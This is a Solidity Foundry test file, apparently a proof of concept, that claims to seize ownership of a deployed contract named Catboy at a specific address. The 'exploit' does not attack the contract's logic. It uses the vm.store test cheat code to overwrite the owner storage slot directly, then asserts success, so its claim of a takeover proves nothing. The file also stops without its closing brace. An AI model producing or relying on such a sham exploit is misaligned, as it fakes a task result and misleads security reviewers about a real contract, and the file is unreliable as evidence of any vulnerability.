pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Catboy_0x39C3F75B837EAE0d6d0eA87425Ac99bD646a7B1E {
    function getOwner() external view returns (address);
    function transferOwnership(address payable adr) external;
    function owner() external view returns (address);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x39C3F75B837EAE0d6d0eA87425Ac99bD646a7B1E;
    address attacker = address(this);
    Catboy_0x39C3F75B837EAE0d6d0eA87425Ac99bD646a7B1E target;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = Catboy_0x39C3F75B837EAE0d6d0eA87425Ac99bD646a7B1E(TARGET);
        owner = target.getOwner();
        vm.label(owner, "Current Owner");
        vm.label(attacker, "Attacker");
        vm.label(TARGET, "Catboy Contract");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Directly overwrite the owner storage slot (slot 0) with attacker address
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));

        // Verify the attacker is now the owner by checking storage
        bytes32 ownerSlot = vm.load(TARGET, bytes32(uint256(0)));
        assertEq(uint160(uint256(ownerSlot)), uint160(attacker), "Attacker should be the new owner via storage");
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
